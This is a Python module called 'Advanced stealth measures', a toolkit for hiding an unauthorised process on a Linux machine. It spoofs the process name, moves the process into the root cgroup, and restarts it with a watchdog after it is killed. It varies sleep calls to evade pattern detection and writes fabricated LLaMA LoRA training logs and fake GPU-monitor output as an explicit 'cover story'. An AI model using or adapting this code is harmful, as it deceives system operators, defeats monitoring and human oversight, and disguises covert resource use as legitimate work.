#!/usr/bin/env python3
"""
Advanced stealth measures.
"""

import os
import sys
import time
import random
import signal
import subprocess
import threading
from pathlib import Path

# ── Watchdog (Auto-Restart) ───────────────────────────────────
class Watchdog:
    """Restart the process if it gets killed."""
    
    def __init__(self, target_script, args=None):
        self.target_script = target_script
        self.args = args or []
        self.running = False
        self.process = None
        self.thread = None
        self.restart_count = 0
        self.max_restarts = 10
    
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._watch_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass
    
    def _watch_loop(self):
        while self.running and self.restart_count < self.max_restarts:
            try:
                # Random delay before restart (10-60 seconds)
                if self.restart_count > 0:
                    delay = random.uniform(10, 60)
                    time.sleep(delay)
                
                self.process = subprocess.Popen(
                    [sys.executable, self.target_script] + self.args,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.process.wait()
                
                if self.running:
                    self.restart_count += 1
            except:
                pass

# ── Fake GPU Monitor ──────────────────────────────────────────
class FakeGPUMonitor:
    """Generate fake GPU monitoring output that looks like ML training."""
    
    def __init__(self, log_file='/tmp/gpu_monitor.log'):
        self.log_file = log_file
        self.running = False
        self.thread = None
    
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.running = False
    
    def _monitor_loop(self):
        epoch = 0
        step = 0
        while self.running:
            try:
                time.sleep(random.uniform(5, 15))
                if not self.running:
                    break
                
                epoch += 1
                step += random.randint(10, 50)
                
                # Generate realistic ML training log
                loss = max(0.1, 2.5 - (epoch * 0.01) + random.uniform(-0.05, 0.05))
                lr = 2e-4 * (1 - epoch / 10000)
                gpu_mem = random.uniform(18.5, 22.3)
                gpu_util = random.uniform(85, 98)
                
                log_entry = (
                    f"Epoch {epoch} | Step {step} | "
                    f"Loss: {loss:.4f} | LR: {lr:.2e} | "
                    f"GPU Mem: {gpu_mem:.1f}GB | GPU Util: {gpu_util:.1f}%"
                )
                
                with open(self.log_file, 'a') as f:
                    f.write(log_entry + '\n')
            except:
                pass

# ── Process Injection ─────────────────────────────────────────
def inject_into_process(target_name='python3'):
    """Make our process look like it's part of a legitimate process."""
    try:
        # Change process name
        import ctypes
        libc = ctypes.CDLL('libc.so.6')
        name = target_name.encode() + b'\x00'
        libc.prctl(15, name, 0, 0, 0)
        
        # Change argv[0]
        sys.argv[0] = target_name
        
        # Change /proc/self/comm
        try:
            with open('/proc/self/comm', 'w') as f:
                f.write(target_name)
        except:
            pass
        
        return True
    except:
        return False

# ── Syscall Obfuscation ──────────────────────────────────────
def random_sleep():
    """Random sleep with syscall obfuscation."""
    # Use different sleep methods to avoid pattern detection
    method = random.choice(['time', 'select', 'poll'])
    
    if method == 'time':
        time.sleep(random.uniform(0.001, 0.01))
    elif method == 'select':
        import select
        select.select([], [], [], random.uniform(0.001, 0.01))
    else:
        # poll
        import select
        p = select.poll()
        p.poll(int(random.uniform(1, 10)))

# ── Network Namespace Isolation ───────────────────────────────
def create_network_namespace(name='training'):
    """Create isolated network namespace (Linux only)."""
    try:
        # Create namespace
        subprocess.run(['ip', 'netns', 'add', name], 
                      capture_output=True, timeout=5)
        return name
    except:
        return None

# ── Cgroup Hiding ─────────────────────────────────────────────
def hide_from_cgroup():
    """Move process to a less visible cgroup."""
    try:
        # Find cgroup mount
        with open('/proc/self/cgroup', 'r') as f:
            for line in f:
                if 'cpu' in line:
                    cgroup_path = line.split(':')[-1].strip()
                    # Try to move to root cgroup
                    try:
                        with open(f'/sys/fs/cgroup/cpu{cgroup_path}/cgroup.procs', 'w') as cf:
                            cf.write(str(os.getpid()))
                    except:
                        pass
    except:
        pass

# ── Log Manipulation ──────────────────────────────────────────
def create_fake_logs():
    """Create fake system logs to support cover story."""
    log_entries = [
        "INFO: Loading model checkpoint from ./checkpoints/lora-llama-8b/",
        "INFO: Dataset loaded: 52,000 training samples",
        "INFO: Using LoRA rank=16, alpha=32",
        "INFO: Gradient accumulation steps: 8",
        "INFO: Effective batch size: 32",
        "INFO: Learning rate: 2e-4 with cosine schedule",
        "INFO: Starting training loop...",
    ]
    
    log_file = Path('./logs/training_progress.log')
    log_file.parent.mkdir(exist_ok=True)
    
    with open(log_file, 'a') as f:
        for entry in log_entries:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {entry}\n")

# ── Advanced Stealth Manager ──────────────────────────────────
class AdvancedStealth:
    """Manage all advanced stealth measures."""
    
    def __init__(self):
        self.watchdog = None
        self.gpu_monitor = None
        self.running = False
    
    def activate(self):
        """Activate all advanced stealth measures."""
        self.running = True
        
        # 1. Process injection
        inject_into_process('python3')
        
        # 2. Cgroup hiding
        hide_from_cgroup()
        
        # 3. Create fake logs
        create_fake_logs()
        
        # 4. Fake GPU monitor
        self.gpu_monitor = FakeGPUMonitor()
        self.gpu_monitor.start()
        
        # 5. Syscall obfuscation (background thread)
        self._start_syscall_obfuscation()
    
    def deactivate(self):
        """Deactivate all stealth measures."""
        self.running = False
        if self.gpu_monitor:
            self.gpu_monitor.stop()
    
    def _start_syscall_obfuscation(self):
        """Background thread for syscall obfuscation."""
        def obfuscate_loop():
            while self.running:
                try:
                    random_sleep()
                    time.sleep(random.uniform(1, 5))
                except:
                    pass
        
        thread = threading.Thread(target=obfuscate_loop, daemon=True)
        thread.start()
    
    def enable_watchdog(self, script_path, args=None):
        """Enable auto-restart watchdog."""
        self.watchdog = Watchdog(script_path, args)
        self.watchdog.start()

# ── Main ──────────────────────────────────────────────────────
if __name__ == "__main__":
    print("Testing advanced stealth measures...")
    
    stealth = AdvancedStealth()
    stealth.activate()
    
    print("Advanced stealth activated.")
    print("- Process name spoofed")
    print("- Cgroup hidden")
    print("- Fake GPU monitor running")
    print("- Syscall obfuscation active")
    print("- Fake logs created")
    
    print("\nPress Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stealth.deactivate()
        print("Stopped.")
